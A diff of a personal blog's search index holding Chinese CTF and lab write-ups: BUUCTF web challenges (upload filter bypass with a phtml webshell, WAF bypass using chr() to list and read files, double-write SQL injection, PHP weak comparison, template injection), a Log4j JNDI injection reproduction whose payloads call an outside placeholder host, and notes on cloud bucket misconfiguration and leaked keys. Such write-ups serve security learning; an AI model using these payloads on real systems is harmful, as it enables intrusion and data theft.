@@ -1,6 +1,70 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>BUUCTF刷题日志2</title>
+    <url>/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/</url>
+    <content><![CDATA[<h1 id="BUUCTF刷题日志2"><a href="#BUUCTF刷题日志2" class="headerlink" title="BUUCTF刷题日志2"></a>BUUCTF刷题日志2</h1><h2 id="第一题-极客大挑战-2019-Upload"><a href="#第一题-极客大挑战-2019-Upload" class="headerlink" title="第一题 [极客大挑战 2019]Upload"></a>第一题 [极客大挑战 2019]Upload</h2><p>一个文件上传，过滤了php3，但是除了php3我们还有phtml，上传的时候改下content-type:image/jpeg</p>
+<p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117150427298.png" alt="image-20220117150427298"></p>
+<p>但是我们的马里面的&lt;?又被过滤了，所以用<code>&lt;script language=&quot;php&quot;&gt;   &lt;/script&gt; </code>来进行绕过</p>
+<p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117151055301.png" alt="image-20220117151055301"></p>
+<p>添加一个gif的文件头进去，绕过这个判断</p>
+<p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117151122705.png" alt="image-20220117151122705"></p>
+<p>上传成功</p>
+<p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117151158231.png" alt="image-20220117151158231"></p>
+<p>猜测路径为<code>/upload/新建文本文档.phtml</code></p>
+<p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117152049720.png" alt="image-20220117152049720"></p>
+<p>成功在根目录找到flag</p>
+<h2 id="第二题-文件上传"><a href="#第二题-文件上传" class="headerlink" title="第二题 文件上传"></a>第二题 文件上传</h2><p>一个前端绕过罢了，还是用phtml文件</p>
+<p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117154044267.png" alt="image-20220117154044267"></p>
+<p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117154204041.png" alt="image-20220117154204041"></p>
+<p>在根目录找到flag</p>
+<h2 id="第三题-php解析特性-char绕过"><a href="#第三题-php解析特性-char绕过" class="headerlink" title="第三题 php解析特性 char绕过"></a>第三题 php解析特性 char绕过</h2><p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117154748431.png" alt="image-20220117154748431"></p>
+<p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117154838651.png" alt="image-20220117154838651"></p>
+<p>有前端验证</p>
+<p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117155745159.png" alt="image-20220117155745159"></p>
+<p>在源码中发现了calc.php<img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117161601913.png" alt="image-20220117161601913"></p>
+<p>写不来了，看了别人的wp，</p>
+<p>然后说waf无法识别加了空格的num参数，” num”和”num”，加了空格就不是num参数了，但是php解析的时候会自动把空格去掉，然后就绕过了waf。</p>
+<p>然后使用scandir()函数，scandir(“/“)但是/被过滤了，所以用char(“47”)来代替</p>
+<p><code>? num=print_r(scandir(chr(47)));</code></p>
+<p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117162229698.png" alt="image-20220117162229698"></p>
+<p>发现flag，然后就访问这个flag</p>
+<p>calc.php? <code>num=1;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</code></p>
+<h2 id="第四题-sql注入-极客大挑战-2019-BabySQL"><a href="#第四题-sql注入-极客大挑战-2019-BabySQL" class="headerlink" title="第四题 sql注入[极客大挑战 2019]BabySQL"></a>第四题 sql注入[极客大挑战 2019]BabySQL</h2><p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117170804546.png" alt="image-20220117170804546"></p>
+<p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117170814134.png" alt="image-20220117170814134"></p>
+<p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117171730895.png" alt="image-20220117171730895"></p>
+<p>但是可以双写绕过select和union</p>
+<p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117171950628.png" alt="image-20220117171950628"></p>
+<p>爆出列数有三个</p>
+<p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117172055414.png" alt="image-20220117172055414"></p>
+<p>然后又是枯燥的爆表爆字段</p>
+<p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117172428770.png" alt="image-20220117172428770"></p>
+<p>人嘛了，information里面的or都被过滤了</p>
+<p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117172541108.png" alt="image-20220117172541108"></p>
+<p>反正一步一步爆，然后就出来了</p>
+<p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117173343401.png" alt="image-20220117173343401"></p>
+<h2 id="第五题-备份文件-代码审计-弱类型"><a href="#第五题-备份文件-代码审计-弱类型" class="headerlink" title="第五题 备份文件 代码审计 弱类型"></a>第五题 备份文件 代码审计 弱类型</h2><p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117201827743.png" alt="image-20220117201827743"></p>
+<p>发现备份文件,又是代码审计</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$key</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!is_numeric(<span class="variable">$key</span>)) &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&quot;Just num!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$key</span> = intval(<span class="variable">$key</span>);</span><br><span class="line">    <span class="variable">$str</span> = <span class="string">&quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$key</span> == <span class="variable">$str</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Try to find out source file!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>弱比较：如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换成数值并且比较按照数值来进行，在比较时该字符串的开始部分决定了它的值，如果该字符串以合法的数值开始，则使用该数值，否则其值为0。</p>
+<p>所以我们直接传值key=123</p>
+<p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117202715872.png" alt="image-20220117202715872"></p>
+<p>得到flag</p>
+<h2 id="第六题-模板注入"><a href="#第六题-模板注入" class="headerlink" title="第六题 模板注入"></a>第六题 模板注入</h2><p>经典老题目了</p>
+<p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117202952675.png" alt="image-20220117202952675"></p>
+<p>flag中提示了flag的位置<code>flag in /fllllllllllllag</code></p>
+<p>welcome中提示了<code>render</code>模板渲染用的函数</p>
+<p>hints中提示了filehash的加密方法<code>md5(cookie_secret+md5(filename))</code></p>
+<p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117203315129.png" alt="image-20220117203315129"></p>
+<p>然后就开始模板注入，我们的目的就是获取cookie_secret</p>
+<p>[(33条消息) BUUCTF <a href="https://blog.csdn.net/weixin_45642610/article/details/112519061">护网杯 2018]easy_tornado 1_wow小华的博客-CSDN博客</a></p>
+]]></content>
+      <categories>
+        <category>-Experience</category>
+      </categories>
+  </entry>
+  <entry>
     <title>BUUCTF 的一些签到题 内有sql 命令执行(内联)</title>
     <url>/2022/01/15/BUUCTF-%E7%9A%84%E4%B8%80%E4%BA%9B%E7%AD%BE%E5%88%B0%E9%A2%98-%E5%86%85%E6%9C%89sql-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%86%85%E8%81%94/</url>
     <content><![CDATA[<h1 id="BUUCTF-的一些签到题-内有sql-命令执行"><a href="#BUUCTF-的一些签到题-内有sql-命令执行" class="headerlink" title="BUUCTF 的一些签到题 内有sql 命令执行"></a>BUUCTF 的一些签到题 内有sql 命令执行</h1><h2 id="第一题-easy-sql"><a href="#第一题-easy-sql" class="headerlink" title="第一题 easy sql"></a>第一题 easy sql</h2><p><img src="/2022/01/15/BUUCTF-%E7%9A%84%E4%B8%80%E4%BA%9B%E7%AD%BE%E5%88%B0%E9%A2%98-%E5%86%85%E6%9C%89sql-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E5%86%85%E8%81%94/image-20220115110256458.png" alt="image-20220115110256458"></p>
@@ -128,82 +192,18 @@
       </categories>
   </entry>
   <entry>
-    <title>BUUCTF刷题日志2</title>
-    <url>/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/</url>
-    <content><![CDATA[<h1 id="BUUCTF刷题日志2"><a href="#BUUCTF刷题日志2" class="headerlink" title="BUUCTF刷题日志2"></a>BUUCTF刷题日志2</h1><h2 id="第一题-极客大挑战-2019-Upload"><a href="#第一题-极客大挑战-2019-Upload" class="headerlink" title="第一题 [极客大挑战 2019]Upload"></a>第一题 [极客大挑战 2019]Upload</h2><p>一个文件上传，过滤了php3，但是除了php3我们还有phtml，上传的时候改下content-type:image/jpeg</p>
-<p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117150427298.png" alt="image-20220117150427298"></p>
-<p>但是我们的马里面的&lt;?又被过滤了，所以用<code>&lt;script language=&quot;php&quot;&gt;   &lt;/script&gt; </code>来进行绕过</p>
-<p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117151055301.png" alt="image-20220117151055301"></p>
-<p>添加一个gif的文件头进去，绕过这个判断</p>
-<p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117151122705.png" alt="image-20220117151122705"></p>
-<p>上传成功</p>
-<p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117151158231.png" alt="image-20220117151158231"></p>
-<p>猜测路径为<code>/upload/新建文本文档.phtml</code></p>
-<p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117152049720.png" alt="image-20220117152049720"></p>
-<p>成功在根目录找到flag</p>
-<h2 id="第二题-文件上传"><a href="#第二题-文件上传" class="headerlink" title="第二题 文件上传"></a>第二题 文件上传</h2><p>一个前端绕过罢了，还是用phtml文件</p>
-<p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117154044267.png" alt="image-20220117154044267"></p>
-<p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117154204041.png" alt="image-20220117154204041"></p>
-<p>在根目录找到flag</p>
-<h2 id="第三题-php解析特性-char绕过"><a href="#第三题-php解析特性-char绕过" class="headerlink" title="第三题 php解析特性 char绕过"></a>第三题 php解析特性 char绕过</h2><p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117154748431.png" alt="image-20220117154748431"></p>
-<p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117154838651.png" alt="image-20220117154838651"></p>
-<p>有前端验证</p>
-<p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117155745159.png" alt="image-20220117155745159"></p>
-<p>在源码中发现了calc.php<img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117161601913.png" alt="image-20220117161601913"></p>
-<p>写不来了，看了别人的wp，</p>
-<p>然后说waf无法识别加了空格的num参数，” num”和”num”，加了空格就不是num参数了，但是php解析的时候会自动把空格去掉，然后就绕过了waf。</p>
-<p>然后使用scandir()函数，scandir(“/“)但是/被过滤了，所以用char(“47”)来代替</p>
-<p><code>? num=print_r(scandir(chr(47)));</code></p>
-<p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117162229698.png" alt="image-20220117162229698"></p>
-<p>发现flag，然后就访问这个flag</p>
-<p>calc.php? <code>num=1;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</code></p>
-<h2 id="第四题-sql注入-极客大挑战-2019-BabySQL"><a href="#第四题-sql注入-极客大挑战-2019-BabySQL" class="headerlink" title="第四题 sql注入[极客大挑战 2019]BabySQL"></a>第四题 sql注入[极客大挑战 2019]BabySQL</h2><p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117170804546.png" alt="image-20220117170804546"></p>
-<p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117170814134.png" alt="image-20220117170814134"></p>
-<p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117171730895.png" alt="image-20220117171730895"></p>
-<p>但是可以双写绕过select和union</p>
-<p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117171950628.png" alt="image-20220117171950628"></p>
-<p>爆出列数有三个</p>
-<p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117172055414.png" alt="image-20220117172055414"></p>
-<p>然后又是枯燥的爆表爆字段</p>
-<p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117172428770.png" alt="image-20220117172428770"></p>
-<p>人嘛了，information里面的or都被过滤了</p>
-<p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117172541108.png" alt="image-20220117172541108"></p>
-<p>反正一步一步爆，然后就出来了</p>
-<p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117173343401.png" alt="image-20220117173343401"></p>
-<h2 id="第五题-备份文件-代码审计-弱类型"><a href="#第五题-备份文件-代码审计-弱类型" class="headerlink" title="第五题 备份文件 代码审计 弱类型"></a>第五题 备份文件 代码审计 弱类型</h2><p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117201827743.png" alt="image-20220117201827743"></p>
-<p>发现备份文件,又是代码审计</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$key</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!is_numeric(<span class="variable">$key</span>)) &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&quot;Just num!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$key</span> = intval(<span class="variable">$key</span>);</span><br><span class="line">    <span class="variable">$str</span> = <span class="string">&quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$key</span> == <span class="variable">$str</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Try to find out source file!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>弱比较：如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换成数值并且比较按照数值来进行，在比较时该字符串的开始部分决定了它的值，如果该字符串以合法的数值开始，则使用该数值，否则其值为0。</p>
-<p>所以我们直接传值key=123</p>
-<p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117202715872.png" alt="image-20220117202715872"></p>
-<p>得到flag</p>
-<h2 id="第六题-模板注入"><a href="#第六题-模板注入" class="headerlink" title="第六题 模板注入"></a>第六题 模板注入</h2><p>经典老题目了</p>
-<p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117202952675.png" alt="image-20220117202952675"></p>
-<p>flag中提示了flag的位置<code>flag in /fllllllllllllag</code></p>
-<p>welcome中提示了<code>render</code>模板渲染用的函数</p>
-<p>hints中提示了filehash的加密方法<code>md5(cookie_secret+md5(filename))</code></p>
-<p><img src="/2022/01/17/BUUCTF%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%972/image-20220117203315129.png" alt="image-20220117203315129"></p>
-<p>然后就开始模板注入，我们的目的就是获取cookie_secret</p>
-<p>[(33条消息) BUUCTF <a href="https://blog.csdn.net/weixin_45642610/article/details/112519061">护网杯 2018]easy_tornado 1_wow小华的博客-CSDN博客</a></p>
-]]></content>
-      <categories>
-        <category>-Experience</category>
-      </categories>
-  </entry>
-  <entry>
     <title>CVE-2021-44228 Apache Log4j2 lookup feature JNDI injection     漏洞复现</title>
     <url>/2022/07/09/CVE-2021-44228-Apache-Log4j2-lookup-feature-JNDI-injection-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
     <content><![CDATA[<h1 id="CVE-2021-44228-Apache-Log4j2-lookup-feature-JNDI-injection-漏洞复现"><a href="#CVE-2021-44228-Apache-Log4j2-lookup-feature-JNDI-injection-漏洞复现" class="headerlink" title="CVE-2021-44228 Apache Log4j2 lookup feature JNDI injection     漏洞复现"></a>CVE-2021-44228 Apache Log4j2 lookup feature JNDI injection     漏洞复现</h1><p>此次复现环境使用的是vulhub</p>
 <h1 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h1><p>首先启用vulhub</p>
-<p><img src="/2022/07/09/CVE-2021-44228-Apache-Log4j2-lookup-feature-JNDI-injection-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CVE-2021-44228-Apache-Log4j2-lookup-feature-JNDI-injection-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%5Cimage-20220709123945520.png" alt="image-20220709123945520"></p>
+<p><img src="/2022/07/09/CVE-2021-44228-Apache-Log4j2-lookup-feature-JNDI-injection-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220709123945520.png" alt="image-20220709123945520"></p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#123;jndi:dns://$&#123;sys:java.version&#125;.example.com&#125;是利用JNDI发送DNS请求的Payload，我们将其作为管理员接口的action参数值发送如下数据包：</span><br><span class="line"></span><br><span class="line">GET /solr/admin/cores?action=$&#123;jndi:ldap://$&#123;sys:java.version&#125;.example.com&#125; HTTP/1.1</span><br><span class="line">Host: your-ip:8983</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">我们可以在DNS日志平台收到相关日志，显示出当前Java版本：</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">实际利用JNDI注入漏洞，可以使用这个工具。利用完毕后，可见touch /tmp/success已经成功被执行：</span><br></pre></td></tr></table></figure>
 
 
 
 <p>可以看到dnslog平台上面已经有了java版本</p>
-<p><img src="/2022/07/09/CVE-2021-44228-Apache-Log4j2-lookup-feature-JNDI-injection-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CVE-2021-44228-Apache-Log4j2-lookup-feature-JNDI-injection-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%5Cimage-20220709125247095.png" alt="image-20220709125247095"></p>
-<p><img src="/2022/07/09/CVE-2021-44228-Apache-Log4j2-lookup-feature-JNDI-injection-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CVE-2021-44228-Apache-Log4j2-lookup-feature-JNDI-injection-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%5Cimage-20220709125426263.png" alt="image-20220709125426263"></p>
+<p><img src="/2022/07/09/CVE-2021-44228-Apache-Log4j2-lookup-feature-JNDI-injection-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220709125247095.png" alt="image-20220709125247095"></p>
+<p><img src="/2022/07/09/CVE-2021-44228-Apache-Log4j2-lookup-feature-JNDI-injection-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220709125426263.png" alt="image-20220709125426263"></p>
 <h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p><a href="https://blog.csdn.net/hilaryfrank/article/details/121944757">(88条消息) Log4j2注入漏洞万字剖析-汇总收藏版(攻击步骤、漏洞原理、2.15.0-RC1绕过原理以及2.15.0、2.16.0修复原理)_程序员Daddy的博客-CSDN博客</a></p>
 ]]></content>
       <tags>
@@ -2915,6 +2915,44 @@
       </categories>
   </entry>
   <entry>
+    <title>火线沙龙云存储浅析 观看笔记</title>
+    <url>/2022/03/21/%E7%81%AB%E7%BA%BF%E6%B2%99%E9%BE%99%E4%BA%91%E5%AD%98%E5%82%A8%E6%B5%85%E6%9E%90-%E8%A7%82%E7%9C%8B%E7%AC%94%E8%AE%B0/</url>
+    <content><![CDATA[<h1 id="火线沙龙云存储浅析-观看笔记"><a href="#火线沙龙云存储浅析-观看笔记" class="headerlink" title="火线沙龙云存储浅析 观看笔记"></a>火线沙龙云存储浅析 观看笔记</h1><h1 id="1-何为对象存储"><a href="#1-何为对象存储" class="headerlink" title="1.何为对象存储"></a>1.何为对象存储</h1><p>对线存储(object-based storage)。也可以叫做面向对象的存储，现在也有不少厂商直接把他叫做云存储<img src="/2022/03/21/%E7%81%AB%E7%BA%BF%E6%B2%99%E9%BE%99%E4%BA%91%E5%AD%98%E5%82%A8%E6%B5%85%E6%9E%90-%E8%A7%82%E7%9C%8B%E7%AC%94%E8%AE%B0/image-20220319194028830.png" alt="image-20220319194028830"></p>
+<h1 id="2-对象存储的利用方式"><a href="#2-对象存储的利用方式" class="headerlink" title="2.对象存储的利用方式"></a>2.对象存储的利用方式</h1><h2 id="2-1bucket公开访问"><a href="#2-1bucket公开访问" class="headerlink" title="2.1bucket公开访问"></a>2.1bucket公开访问</h2><p>在此时如果选择公有读的话，会出现两种情况</p>
+<p>1.在只配置读写权限设置为公有读或公共读写的情况下，无法列出对象，但是可以直接访问对应的key路径。</p>
+<p><img src="/2022/03/21/%E7%81%AB%E7%BA%BF%E6%B2%99%E9%BE%99%E4%BA%91%E5%AD%98%E5%82%A8%E6%B5%85%E6%9E%90-%E8%A7%82%E7%9C%8B%E7%AC%94%E8%AE%B0/image-20220319212000584.png" alt="image-20220319212000584"></p>
+<p><img src="/2022/03/21/%E7%81%AB%E7%BA%BF%E6%B2%99%E9%BE%99%E4%BA%91%E5%AD%98%E5%82%A8%E6%B5%85%E6%9E%90-%E8%A7%82%E7%9C%8B%E7%AC%94%E8%AE%B0/image-20220319212010434.png" alt="image-20220319212010434"></p>
+<p>也就是俗话说的，访问其下面的路径，类似未授权访问。</p>
+<p>2.如果想列出object对象，只需要在bucket授权策略中设置listobject即可。<img src="/2022/03/21/%E7%81%AB%E7%BA%BF%E6%B2%99%E9%BE%99%E4%BA%91%E5%AD%98%E5%82%A8%E6%B5%85%E6%9E%90-%E8%A7%82%E7%9C%8B%E7%AC%94%E8%AE%B0/image-20220319212131809.png" alt="image-20220319212131809"></p>
+<p><img src="/2022/03/21/%E7%81%AB%E7%BA%BF%E6%B2%99%E9%BE%99%E4%BA%91%E5%AD%98%E5%82%A8%E6%B5%85%E6%9E%90-%E8%A7%82%E7%9C%8B%E7%AC%94%E8%AE%B0/image-20220319212142347.png" alt="image-20220319212142347"></p>
+<h2 id="2-2bucket桶爆破"><a href="#2-2bucket桶爆破" class="headerlink" title="2.2bucket桶爆破"></a>2.2bucket桶爆破</h2><p>当知道bucket名称的时候，可以通过爆破获得bucket名称，这有些类似于目录爆破，只不过目录爆破一般通过状态码判断，而这个通过页面的内容判断</p>
+<p><img src="/2022/03/21/%E7%81%AB%E7%BA%BF%E6%B2%99%E9%BE%99%E4%BA%91%E5%AD%98%E5%82%A8%E6%B5%85%E6%9E%90-%E8%A7%82%E7%9C%8B%E7%AC%94%E8%AE%B0/image-20220319212403531.png" alt="image-20220319212403531"></p>
+<p>下面是名称对了，第一个是设置了objectlist，后面是没有权限访问</p>
+<p><img src="/2022/03/21/%E7%81%AB%E7%BA%BF%E6%B2%99%E9%BE%99%E4%BA%91%E5%AD%98%E5%82%A8%E6%B5%85%E6%9E%90-%E8%A7%82%E7%9C%8B%E7%AC%94%E8%AE%B0/image-20220319212457984.png" alt="image-20220319212457984"></p>
+<h2 id="2-3特定的bucket策略配置"><a href="#2-3特定的bucket策略配置" class="headerlink" title="2.3特定的bucket策略配置"></a>2.3特定的bucket策略配置</h2><p>特定的策略配置是指，如果管理员设置了某些ip，ua才可以请求改存储桶的话，此时如果错误的配置了getbucketpolicy，可导致攻击者获取策略配置。</p>
+<p><img src="/2022/03/21/%E7%81%AB%E7%BA%BF%E6%B2%99%E9%BE%99%E4%BA%91%E5%AD%98%E5%82%A8%E6%B5%85%E6%9E%90-%E8%A7%82%E7%9C%8B%E7%AC%94%E8%AE%B0/image-20220319212724053.png" alt="image-20220319212724053"></p>
+<p><img src="/2022/03/21/%E7%81%AB%E7%BA%BF%E6%B2%99%E9%BE%99%E4%BA%91%E5%AD%98%E5%82%A8%E6%B5%85%E6%9E%90-%E8%A7%82%E7%9C%8B%E7%AC%94%E8%AE%B0/image-20220319212753558.png" alt="image-20220319212753558"></p>
+<p><img src="/2022/03/21/%E7%81%AB%E7%BA%BF%E6%B2%99%E9%BE%99%E4%BA%91%E5%AD%98%E5%82%A8%E6%B5%85%E6%9E%90-%E8%A7%82%E7%9C%8B%E7%AC%94%E8%AE%B0/image-20220319212821561.png" alt="image-20220319212821561"></p>
+<h2 id="2-4bucket-object遍历"><a href="#2-4bucket-object遍历" class="headerlink" title="2.4bucket object遍历"></a>2.4bucket object遍历</h2><p>类似于目录遍历</p>
+<p><img src="/2022/03/21/%E7%81%AB%E7%BA%BF%E6%B2%99%E9%BE%99%E4%BA%91%E5%AD%98%E5%82%A8%E6%B5%85%E6%9E%90-%E8%A7%82%E7%9C%8B%E7%AC%94%E8%AE%B0/image-20220319212903537.png" alt="image-20220319212903537"></p>
+<h2 id="2-5任意文件上传与覆盖"><a href="#2-5任意文件上传与覆盖" class="headerlink" title="2.5任意文件上传与覆盖"></a>2.5任意文件上传与覆盖</h2><p>如果在配置存储桶，管理员错误的将存储桶权限，配置为可写，这将会导致攻击者可上传任意文件去覆盖。</p>
+<h2 id="2-6accesskeyld，secretaccessket泄露"><a href="#2-6accesskeyld，secretaccessket泄露" class="headerlink" title="2.6accesskeyld，secretaccessket泄露"></a>2.6accesskeyld，secretaccessket泄露</h2><p>1.通过github等开源平台中的源代码中可发现存在泄露的key。</p>
+<p>2.通过反编译apk，小程序找到敏感信息。</p>
+<p>3.在目标网站源代码中找到一些敏感的信息，js等。<img src="/2022/03/21/%E7%81%AB%E7%BA%BF%E6%B2%99%E9%BE%99%E4%BA%91%E5%AD%98%E5%82%A8%E6%B5%85%E6%9E%90-%E8%A7%82%E7%9C%8B%E7%AC%94%E8%AE%B0/image-20220319213139689.png" alt="image-20220319213139689">有个工具推荐，是burp的插件，就是我们把正则表达式配置好，他会自动检测流量，然后看是否复合正则表达式。 </p>
